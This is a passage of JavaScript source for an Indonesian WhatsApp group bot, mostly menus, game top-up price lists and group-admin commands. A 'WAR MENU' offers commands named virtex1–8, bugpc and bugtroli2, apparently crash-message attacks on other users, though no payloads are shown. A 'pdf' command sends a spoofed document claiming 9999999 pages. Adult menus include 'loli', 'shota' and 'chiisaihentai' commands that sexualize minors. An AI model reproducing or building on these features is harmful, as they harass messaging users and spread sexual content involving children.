reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group :(`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
zeroyt7.groupRemove(from, [sender])
}     

//━━━━━━━━━━━━━━━[ CONNECTION 3 ]━━━━━━━━━━━━━━━━━//

colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
if (!isGroup && isCmd) console.log('\x1b[1;31m\x1b[1;37m', '[\x1b[1;32mKxD\x1b[1;37m]', color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
//if (!isGroup && !isCmd) console.log('\x1b[1;31m\x1b[1;37m', '[\x1b[1;31mTEXT\x1b[1;37m]', color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
if (isCmd && isGroup) console.log('\x1b[1;31m\x1b[1;37m', '[\x1b[1;32mKxD\x1b[1;37m]', color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
//if (!isCmd && isGroup) console.log('\x1b[1;31m\x1b[1;37m', '[\x1b[1;31mTEXT\x1b[1;37m]', color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
if (!mek.key.fromMe && banChats === false) return

//━━━━━━━━━━━━━━━[ MENU ]━━━━━━━━━━━━━━━━━//
//zeroyt7.setStatus(`${botname} || Active Time : ${kyun(uptime)} || ${banChats ? 'PUBLIC-MODE' : 'SELF-MODE'}`).catch((_)=>_);

//settingstatus = new Date() * 1; 
switch (command) {
case 'lolkey': 
case 'cekapikey': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${lolkey}`)
teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://api.lolhuman.xyz`
zeroyt7.sendMessage(from, teks, text, {quoted: mek})
break
case 'topup': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
timestamp = speed();
latensi = speed() - timestamp;
run = process.uptime();
lolot = `*${ucapanWaktu} ${pushname}*`
img = fs.readFileSync('thumbnail.jpg')
ok = `
pilih salah satu
`
but = [{ buttonId: `.packtopup`, buttonText: { displayText: 'PACK TOP UP' }, type: 1 },{ buttonId: `.upgradetopup`, buttonText: { displayText: 'UPGRADE TOP UP' }, type: 1 },{ buttonId: `.sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 }]
sendButLoc(from, lolot, ok, img, but)
break
case 'packtopup': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
timestamp = speed();
latensi = speed() - timestamp;
run = process.uptime();
lolot = `*${ucapanWaktu} ${pushname}*`
img = fs.readFileSync('thumbnail.jpg')
ok = `
@everyone 

NEW LIST TOP UP
gemList Price Pack TopUpgem

gemRp. 50.000 / $3,5 
 1000 c 
 Orb Tier 25.000
 Exp scroll 70M 
 Silver 70M 
 Kaguya Stone 15
 
 gemRp. 100.000 / $7 
 2000 c 
  Orb Tier 50.000 
  Silver 150M 
  Exp scroll 150M 
  Kaguya Stone 30 
  150 Shard Sasuke Indra

gemRp. 300.000 / $21
 5.000 c 
 Orb Tier 150.000 
 Silver 300M 
 Exp Scroll 300M 
 Kaguya stone 60
 300 Shard Sasuke Indra 

gemRp. 500.000 / $35 
 10.000 c
 Orb Tier 300.000
 Silver 600M 
 Exp scroll 600M 
 Kaguya Stone 100 
 Ancient Book *5
 500 shard Sasuke Indra
Kaguya Premium gems *10

gemRp. 1.000.000 / $70 
 20.000 c 
Orb Tier 500.000 
Silver 1b 
Exp Scroll 1b
Kaguya Stone 200 
Awaken Jutsu *3 
Esensse scroll 200.000 
1000 Shard Sasuke Indra 
Ancient book *10
Kaguya Premium gem 20
`
but = [{ buttonId: `.owner`, buttonText: { displayText: 'OWNER' }, type: 1 },{ buttonId: `.menu`, buttonText: { displayText: 'MENU' }, type: 1 },{ buttonId: `.sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 }]
sendButLoc(from, lolot, ok, img, but)
break
case 'upgradetopup': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
timestamp = speed();
latensi = speed() - timestamp;
run = process.uptime();
lolot = `*${ucapanWaktu} ${pushname}*`
img = fs.readFileSync('thumbnail.jpg')
ok = `
#FULL MAX PACK#

#Chakra Full ( 1 Opsi ) + Tier up Max Rp. 600.000 / 46$
( 80.394 Cystal + 1.235.500.000 silver + 5Hero B5 + 1Hero B6, B7, B8, B9, B10 ) 

# Full All Unlock PVP Skill Guild Rp. 600.000 / 46$
( 1.148.000 Guild Contribution + 703 M Silver ) 

# Full 1 PVP skill Guild Rp. 350.000 / 27$
( 452.200 Guild Contribution + 1065 Guild Tome ) 

# Sage Tool jutsu Max : Rp. 600.000 / 46$
( 1000 Sage tools jutsu + 50M silver ) 

Sage Max : Rp. 450.000 / 32$
( 70.000 Sage Stone + 500M silver )

#Amplify Phase Max Lvl 200 Rp. 1.200.000
( Chakra Fruit 226.000 + 700M Silver

#Hero 15 Star Level 540 Rp. 450.000

#Hero 15 Star level 100 Rp. 200.000

#Sasuke Indra 15 Star Level 540 Rp. 650.000

#Danzo 20 Star Level 540 Rp. 1.200.000

#Hiruzen 20 Star level 540 Rp. 850.000

#Kakashi 20 Star level 540 Rp. 850.000

#HARGA SATUAN#

#1 Kaguya Gem Rp. 5000 / 0,5$
#1 Kaguya Premium Gem Rp. 25.000 / 3$
#1 Essense scroll Rp. 1
#10.000 Tier Orb Rp. 2.000 
#1 Optional Jutsu Rare Rp. 5000 / 0,5$
#1 Nin Soul 10 Star Rp. 25.000 / 2,5$
#1 Ninja 5 Star Rp. 6.500 / 0,6$ ( Tanpa Sasuke Indra ) 
#1 Ancient Book : Rp. 10.000 / 1$
#1 Gear 5-star Rp. 20.000 / 2$
#1 Sage stone Rp. 64 
#1 Sage tools Jutsu Rp. 640
#1 Beast 5-Star Rp. 50.000 / 5$
#Level 3 Awakening Jutsu Rp. 150.000
#1 Optional Awakening Jutsu Rp. 16.500 / 2$
#1 Awakening stone Rp. 5000 / 0,5 $
#1 Ulti-Gear 5 Star Optional Rp. 20.000 / 2$
#1 Advance Fortune Pearl Rp. 4.000 / 0,5$
#Chakra Fruit 40.000 ; Rp.155.000
#Nindo Stone 100.000 : Rp. 100.000
#1 Myoboku Stone Rp. 100
#1 Samsara jade Rp. 3.500
#5 Skins Ninja Rp. 100.000
`
but = [{ buttonId: `.owner`, buttonText: { displayText: 'OWNER' }, type: 1 },{ buttonId: `.menu`, buttonText: { displayText: 'MENU' }, type: 1 },{ buttonId: `.sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 }]
sendButLoc(from, lolot, ok, img, but)
break
case 'menu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
timestamp = speed();
latensi = speed() - timestamp;
run = process.uptime();
lolot = `*${ucapanWaktu} ${pushname}*`
img = fs.readFileSync('thumbnail.jpg')
ok = `
《TIME INDONESIA》
❱ Date : ${date}
❱ Wib : ${Wib}
❱ Wita : ${Wita}
❱ Wit : ${Wit}

《USER INFO》
❱ Name : *${pushname}*
❱ Bio : *${p1 ? `${p1.status}` : '-'}*
❱ Nomor : *wa.me/${sender.split("@")[0]}*
❱ Status : *${isOwner ? 'Owner' :  'User'}*

《idle Shinobi botz INFO》
❱ Bot Name : *${botname}*
❱ Name : *${ownername}*
❱ Prefix : 「${prefix}」
❱ Mode : *${banChats ? 'PUBLIC' : 'SELF'}*
❱ Lib : *Baileys*
❱ Calender : *${date}*
❱ Time : *${jmn}*
❱ Speed : *${latensi.toFixed(4)} second*
❱ Runtime : *${kyun(run)}*
`
but = [{ buttonId: `.allmenu`, buttonText: { displayText: 'All Menu' }, type: 1 },{ buttonId: `.groupbot`, buttonText: { displayText: 'Group Bot' }, type: 1 },{ buttonId: `.sewabot`, buttonText: { displayText: 'Sewa Bot' }, type: 1 }]
sendButLoc(from, lolot, ok, img, but)
break
case 'allmenu': 
case 'help': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
timestamp = speed();
latensi = speed() - timestamp;
ok = `《idle Shinobi botz INFO》
❱ *Bot Name* : *${botname}*
❱ *Name* : *${ownername}*
❱ *Prefix* : 「${prefix}」
❱ *Mode* : *${banChats ? 'PUBLIC' : 'SELF'}*
❱ *Lib* : *Baileys*
❱ *Hit Today* : *${hit_today.length}*
❱ *Hit All* : *${hitall}*
❱ *Calender* : *${date}*
❱ *Time* : *${jmn}*
❱ *Speed* : *${latensi.toFixed(4)} second*
❱ *Runtime* : *${kyun(process.uptime())}*

《USER INFO》
❱ *Name* : *${pushname}*
❱ *Bio* : *${p1 ? `${p1.status}` : '-'}*
❱ *Api* : *wa.me/${sender.split("@")[0]}*
❱ *Status* : *${isOwner ? 'Owner' : isPremium ? 'Premium User' : 'User'}*

《TIME INDONESIA》
❱ *Date* : *${date}*
❱ *Wib* : *${Wib}*
❱ *Wita* : *${Wita}*
❱ *Wit* : *${Wit}*

《Menuju Tahun Baru》
❱ *${newYear}*
《Menuju Ramadhan》
❱ *${Ramadhan}*

к⃟●❱${p2}${bold}groupmenu${bold}
к⃟●❱${p2}${bold}stickermenu${bold}
к⃟●❱${p2}${bold}randommenu${bold}
к⃟●❱${p2}${bold}downloadmenu${bold}
к⃟●❱${p2}${bold}animemenu${bold}
к⃟●❱${p2}${bold}infomenu${bold}
к⃟●❱${p2}${bold}randomtextmenu${bold}
к⃟●❱${p2}${bold}randomimagemenu${bold}
к⃟●❱${p2}${bold}searchmenu${bold}
к⃟●❱${p2}${bold}kerangmenu${bold}
к⃟●❱${p2}${bold}gamemenu${bold}
к⃟●❱${p2}${bold}stalkmenu${bold}
к⃟●❱${p2}${bold}asupanmenu${bold}
к⃟●❱${p2}${bold}cecanmenu${bold}
к⃟●❱${p2}${bold}textpromenu${bold}
к⃟●❱${p2}${bold}ephotomenu${bold}
к⃟●❱${p2}${bold}bokepmenu${bold}
к⃟●❱${p2}${bold}islammenu${bold}
к⃟●❱${p2}${bold}storagemenu${bold}
к⃟●❱${p2}${bold}warmenu${bold}
к⃟●❱${p2}${bold}ownermenu${bold}
к⃟●❱${p2}${bold}othermenu${bold}
к⃟●❱${p2}${bold}baileysmenu${bold}

《THANKS TO》

*@${Verived.split("@")[0]}*
*@${zer.split("@")[0]}*
*@${kuz.split("@")[0]}*`
but = [{ buttonId: `.botstat`, buttonText: { displayText: 'BOT STATISTIC' }, type: 1 },{ buttonId: `.sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 }]
zeroyt7.sendMessage(from, { contentText: `${ok}`, footerText: `_idle Shinobi botz By rimu_`, buttons : [{ buttonId: `.botstat`, buttonText: { displayText: 'BOT STATISTIC' }, type: 1 },{ buttonId: `.sewabot`, buttonText: { displayText: 'SEWA BOT' }, type: 1 }], 
headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '',
jpegThumbnail: fs.readFileSync("thumbnail.jpg"), 
contextInfo: {mentionedJid: [sender, Verived, zer, kuz + "@s.whatsapp.net"]}}}, 'buttonsMessage')
break 
case 'groupmenu': 
case 'grupmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*GROUP MENU*

к⃟●❱${prefix}antilink 1/0
к⃟●❱${prefix}welcome 1/0 
к⃟●❱${prefix}antivirtex 1/0
к⃟●❱${prefix}antiwame 1/0
к⃟●❱${prefix}antilinkyt 1/0
к⃟●❱${prefix}opengc
к⃟●❱${prefix}closegc
к⃟●❱${prefix}linkgrup
к⃟●❱${prefix}promote
к⃟●❱${prefix}demote
к⃟●❱${prefix}promoteall
к⃟●❱${prefix}demoteall
к⃟●❱${prefix}add
к⃟●❱${prefix}kick
к⃟●❱${prefix}setpp
к⃟●❱${prefix}setdesc
к⃟●❱${prefix}setname
к⃟●❱${prefix}hidetag
к⃟●❱${prefix}hidetag20
к⃟●❱${prefix}totag
к⃟●❱${prefix}kontag
к⃟●❱${prefix}tagall
к⃟●❱${prefix}sider
к⃟●❱${prefix}leave
к⃟●❱${prefix}listonline
к⃟●❱${prefix}getpp
к⃟●❱${prefix}linkgroup
к⃟●❱${prefix}resetlink
к⃟●❱${prefix}jadian

*BY rimu*`
reply(anu)
break
case 'stickermenu': 
case 'stikermenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*STICKER MENU*

к⃟●❱${prefix}ttp
к⃟●❱${prefix}attp
к⃟●❱${prefix}sticker
к⃟●❱${prefix}patrick
к⃟●❱${prefix}doge
к⃟●❱${prefix}anime
к⃟●❱${prefix}gawgura

*BY rimu*`
reply(anu)
break
case 'convertmenu': 
case 'cvmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*CONVERT MENU*
к⃟●❱${prefix}tomp3
к⃟●❱${prefix}tovideo
к⃟●❱${prefix}toimg
к⃟●❱${prefix}imgtourl
к⃟●❱${prefix}tinyurl
к⃟●❱${prefix}shorturl
к⃟●❱${prefix}cuttly

*BY rimu*`
reply(anu)
break
case 'randommenu': 
case 'randomenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*RANDOM MENU*

к⃟●❱${prefix}meme
к⃟●❱${prefix}memeindo
к⃟●❱${prefix}darkjoke

*BY rimu*`
reply(anu)
break
case 'downloadmenu': 
case 'downloadermenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*DOWNLOAD MENU*

к⃟●❱${prefix}play
к⃟●❱${prefix}ytsearch
к⃟●❱${prefix}tiktokmusic
к⃟●❱${prefix}pinterest

*BY rimu*`
reply(anu)
break
case 'islammenu': 
case 'islamimenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*ISLAM MENU*

к⃟●❱${prefix}alquran
к⃟●❱${prefix}asmaulhusna
к⃟●❱${prefix}alquranaudio
к⃟●❱${prefix}jadwalsholat
к⃟●❱${prefix}kisahnabi
к⃟●❱${prefix}listsurah

*BY rimu*`
reply(anu)
break
case 'animemenu': 
case 'animenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*ANIME MENU*

к⃟●❱${prefix}character
к⃟●❱${prefix}manga
к⃟●❱${prefix}anime
к⃟●❱${prefix}kusonimesearch
к⃟●❱${prefix}otakudesusearch
к⃟●❱${prefix}nhentaisearch
к⃟●❱${prefix}nekopoisearch

*BY rimu*`
reply(anu)
break
case 'infomenu': 
case 'informationmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*INFO MENU*

к⃟●❱${prefix}kbbi
к⃟●❱${prefix}infogempa
к⃟●❱${prefix}covidindo
к⃟●❱${prefix}covidglobal
к⃟●❱${prefix}jadwaltv
к⃟●❱${prefix}translate
к⃟●❱${prefix}cuaca
к⃟●❱${prefix}wikipedia
к⃟●❱${prefix}jarak

*BY rimu*`
reply(anu)
break
case 'randomtextmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*RANDOM TEXT MENU*

к⃟●❱${prefix}quotes
к⃟●❱${prefix}quotesanime
к⃟●❱${prefix}quotesdilan
к⃟●❱${prefix}quotesimage
к⃟●❱${prefix}katabijak
к⃟●❱${prefix}randomnama
к⃟●❱${prefix}nicknameff
к⃟●❱${prefix}nicknamepubg
к⃟●❱${prefix}nicknameml

*BY rimu*`
reply(anu)
break
case 'searchmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*SEARCH MENU*
к⃟●❱${prefix}gimage
к⃟●❱${prefix}wallpapersearch
к⃟●❱${prefix}playstore
к⃟●❱${prefix}shopee
к⃟●❱${prefix}google

*BY rimu*`
reply(anu)
break
case 'kerangmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*KERANG MENU*

к⃟●❱${prefix}tebakumur
к⃟●❱${prefix}artinama
к⃟●❱${prefix}jodoh
к⃟●❱${prefix}truth 
к⃟●❱${prefix}dare
к⃟●❱${prefix}toxic
к⃟●❱${prefix}cekwatak
к⃟●❱${prefix}cekmati
к⃟●❱${prefix}cekbapak
к⃟●❱${prefix}apakah
к⃟●❱${prefix}kapankah
к⃟●❱${prefix}rate
к⃟●❱${prefix}hobby

*BY rimu*`
reply(anu)
break
case 'gamemenu': 
case 'funmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*GAME MENU*

к⃟●❱${prefix}tictactoe @tag
к⃟●❱${prefix}delsesittt
к⃟●❱${prefix}gelud @tag
к⃟●❱${prefix}delsesigelud
к⃟●❱${prefix}tebakkalimat
к⃟●❱${prefix}tebakkata
к⃟●❱${prefix}tebakgambar
к⃟●❱${prefix}tebaklirik
к⃟●❱${prefix}tebaktebakan
к⃟●❱${prefix}tebakkimia
к⃟●❱${prefix}tebakjenaka
к⃟●❱${prefix}suit
к⃟●❱${prefix}slot

*BY rimu*`
reply(anu)
break
case 'stalkingmenu': 
case 'stalkmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*STALK MENU*

к⃟●❱${prefix}stalkig
к⃟●❱${prefix}stalkgithub
к⃟●❱${prefix}stalktiktok

*BY rimu*`
reply(anu)
break
case 'asupanmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*ASUPAN MENU*
к⃟●❱${prefix}asupan
к⃟●❱${prefix}asupancecan
к⃟●❱${prefix}asupanhijaber
к⃟●❱${prefix}asupanuhkti
к⃟●❱${prefix}asupanbocil
к⃟●❱${prefix}asupanghea
к⃟●❱${prefix}asupanrika

*BY rimu*`
reply(anu)
break
case 'cecanmenu': case 'cewemenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*CECAN MENU*

к⃟●❱${prefix}cecanvietnam
к⃟●❱${prefix}cecanmalaysia
к⃟●❱${prefix}cecankorea
к⃟●❱${prefix}cecanindonesia
к⃟●❱${prefix}cecanjapan
к⃟●❱${prefix}cecanthailand

*BY rimu*`
reply(anu)
break
case 'textpromenu': 
case 'textprome': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*TEXT PRO MENU*

к⃟●❱${prefix}blackpink 
к⃟●❱${prefix}neon 
к⃟●❱${prefix}greenneon 
к⃟●❱${prefix}advancglow 
к⃟●❱${prefix}futureneon 
к⃟●❱${prefix}sandwriting 
к⃟●❱${prefix}sandsummer 
к⃟●❱${prefix}sandengrave 
к⃟●❱${prefix}metaldrak 
к⃟●❱${prefix}neonlight 
к⃟●❱${prefix}holographik
к⃟●❱${prefix}1917 
к⃟●❱${prefix}minion 
к⃟●❱${prefix}deluxesilver 
к⃟●❱${prefix}newyearcard 
к⃟●❱${prefix}bloodfrosted 
к⃟●❱${prefix}halloween
к⃟●❱${prefix}jokerlogo 
к⃟●❱${prefix}fireworksparkles
к⃟●❱${prefix}natureleaves 
к⃟●❱${prefix}bokeh 
к⃟●❱${prefix}toxic 
к⃟●❱${prefix}strawberry 
к⃟●❱${prefix}box3d 
к⃟●❱${prefix}roadwarning 
к⃟●❱${prefix}breakwall 
к⃟●❱${prefix}icecold 
к⃟●❱${prefix}Iuxury 
к⃟●❱${prefix}clOud 
к⃟●❱${prefix}summersand 
к⃟●❱${prefix}horroblod 
к⃟●❱${prefix}thunder 

*BY rimu*`
reply(anu)
break
case 'ephotomenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*EPHOTO MENU*

к⃟●❱${prefix}wetglass
к⃟●❱${prefix}multicolor3d
к⃟●❱${prefix}watercolor
к⃟●❱${prefix}luxurygold
к⃟●❱${prefix}galaxywallpaper
к⃟●❱${prefix}lighttext
к⃟●❱${prefix}beautifulflower
к⃟●❱${prefix}puppycute
к⃟●❱${prefix}royaltext
к⃟●❱${prefix}heartshaped
к⃟●❱${prefix}birthdaycake
к⃟●❱${prefix}galaxystyle
к⃟●❱${prefix}hologram
к⃟●❱${prefix}greenneon
к⃟●❱${prefix}glossychrome
к⃟●❱${prefix}greenbush
к⃟●❱${prefix}metallogo
к⃟●❱${prefix}noeltext
к⃟●❱${prefix}glittergold
к⃟●❱${prefix}textcake
к⃟●❱${prefix}startsnight
к⃟●❱${prefix}wooden3d
к⃟●❱${prefix}textbyname
к⃟●❱${prefix}writegalacy
к⃟●❱${prefix}galaxybat
к⃟●❱${prefix}snow3d
к⃟●❱${prefix}birthdayday
к⃟●❱${prefix}goldplaybutton
к⃟●❱${prefix}silverplaybutton
к⃟●❱${prefix}freefire

*BY rimu*`
reply(anu)
break
case 'bokepmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*BOKEP MENU*
к⃟●❱${prefix}bokep1
к⃟●❱${prefix}bokep2
к⃟●❱${prefix}bokep3
к⃟●❱${prefix}bokep4
к⃟●❱${prefix}bokep5
к⃟●❱${prefix}bokep6
к⃟●❱${prefix}bokep7
к⃟●❱${prefix}bokep8
к⃟●❱${prefix}bokep9
к⃟●❱${prefix}bokep10

*BY rimu*`
reply(anu)
break
case 'storagemenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*STORAGE MENU*

к⃟●❱${prefix}addimage
к⃟●❱${prefix}listimage
к⃟●❱${prefix}getimage
к⃟●❱${prefix}addvn
к⃟●❱${prefix}listvn
к⃟●❱${prefix}getvn
к⃟●❱${prefix}robot
к⃟●❱${prefix}slow
к⃟●❱${prefix}fast
к⃟●❱${prefix}sound1
к⃟●❱${prefix}sound2
к⃟●❱${prefix}sound3
к⃟●❱${prefix}sound4
к⃟●❱${prefix}sound5

*BY rimu*`
reply(anu)
break
case 'randomimagemenu': 
case 'randomimage': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*RANDOM IMAGE MENU*

к⃟●❱${prefix}art
к⃟●❱${prefix}bts
к⃟●❱${prefix}exo
к⃟●❱${prefix}elf
к⃟●❱${prefix}loli
к⃟●❱${prefix}neko
к⃟●❱${prefix}waifu
к⃟●❱${prefix}shota
к⃟●❱${prefix}husbu
к⃟●❱${prefix}sagiri
к⃟●❱${prefix}shinobu
к⃟●❱${prefix}wallnime
к⃟●❱${prefix}megumin
к⃟●❱${prefix}chiisaihentai
к⃟●❱${prefix}trap
к⃟●❱${prefix}blowjob
к⃟●❱${prefix}yaoi
к⃟●❱${prefix}ecchi
к⃟●❱${prefix}hentai
к⃟●❱${prefix}ahegao
к⃟●❱${prefix}hololewd
к⃟●❱${prefix}sideoppai
к⃟●❱${prefix}animefeets
к⃟●❱${prefix}animebooty
к⃟●❱${prefix}animethighss
к⃟●❱${prefix}animearmpits
к⃟●❱${prefix}hentaifemdom
к⃟●❱${prefix}lewdanimegirls
к⃟●❱${prefix}biganimetiddies
к⃟●❱${prefix}hentai4everyone

*BY rimu*`
reply(anu)
break
case 'ownermenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*BOSS MENU*

к⃟●❱${prefix}*bc*
к⃟●❱${prefix}*bcgc*
к⃟●❱${prefix}*tobc*
к⃟●❱${prefix}*premium add*
к⃟●❱${prefix}*premium del*
к⃟●❱${prefix}*ban*
к⃟●❱${prefix}*unban*
к⃟●❱${prefix}*q*
к⃟●❱${prefix}*clearall*
к⃟●❱${prefix}*setthumb*
к⃟●❱${prefix}*self*
к⃟●❱${prefix}*public*

*BY rimu*`
reply(anu)
break
case 'warmenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*WAR MENU*

к⃟●❱${prefix}virtex1
к⃟●❱${prefix}virtex2
к⃟●❱${prefix}virtex3
к⃟●❱${prefix}virtex4
к⃟●❱${prefix}virtex5
к⃟●❱${prefix}virtex6
к⃟●❱${prefix}virtex7
к⃟●❱${prefix}virtex8
к⃟●❱${prefix}vipi
к⃟●❱${prefix}buglokasi
к⃟●❱${prefix}bugpc
к⃟●❱${prefix}bugtroli2

*BY rimu*`
reply(anu)
break
case 'baileysmenu': 
case 'baileymenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*BAILEYS MENU*
к⃟●❱x 
к⃟●❱>  
к⃟●❱${prefix}jadibot
к⃟●❱${prefix}stopjadibot

*BY rimu*`
reply(anu)
break
case 'othermenu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = `*OTHER MENU*

к⃟●❱${prefix}ultah
к⃟●❱${prefix}tag 62xxx
к⃟●❱${prefix}tagme
к⃟●❱${prefix}report
к⃟●❱${prefix}store
к⃟●❱${prefix}owner
к⃟●❱${prefix}readmore
к⃟●❱${prefix}delete
к⃟●❱${prefix}cekpremium
к⃟●❱${prefix}listpremium
к⃟●❱${prefix}nulis

*BY rimu*`
reply(anu)
break
case 'pdf': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
otod = "62895320009580@s.whatsapp.net"
dtod = `${sender}`
uwu = '```'
tescok = `*Fake Doc By rimu*`
Sendbutdocument(from, tescok, "rimuX", fs.readFileSync('./F4/rimuX.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('thumbnail.jpg'), filename:`rimuX.pdf`, pageCount: 9999999 }, [{buttonId:`!86`,buttonText:{displayText:'rimuX'},type:1}], {quoted:fstatus, contextInfo: { mentionedJid: [dtod,otod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Hi ${pushname}\nDownload Script`,mediaType:"2",thumbnail:fs.readFileSync('thumbnail.jpg'),mediaUrl:`https://youtu.be/dQw4w9WgXcQ`}}})
break

//━━━━━━━━━━━━━━━[ FITUR GROUP ]━━━━━━━━━━━━━━━━━//

case 'demoteall': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return(mess.only.admin)
 if (!isBotGroupAdmins) return(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
   	members_id.push(mem.jid)
  	}
zeroyt7.groupDemoteAdmin(from, members_id)
break
case 'promoteall': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
 if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return(mess.only.admin)
 if (!isBotGroupAdmins) return(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
   	members_id.push(mem.jid)
  	}
zeroyt7.groupMakeAdmin(from, members_id)
break
case 'sider': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isGroup) return reply(mess.only.group)
infom = await zeroyt7.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'resetlinkgc': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
 case 'resetlinkgroup': 
if (isBanned) return reply(mess.Ban) 
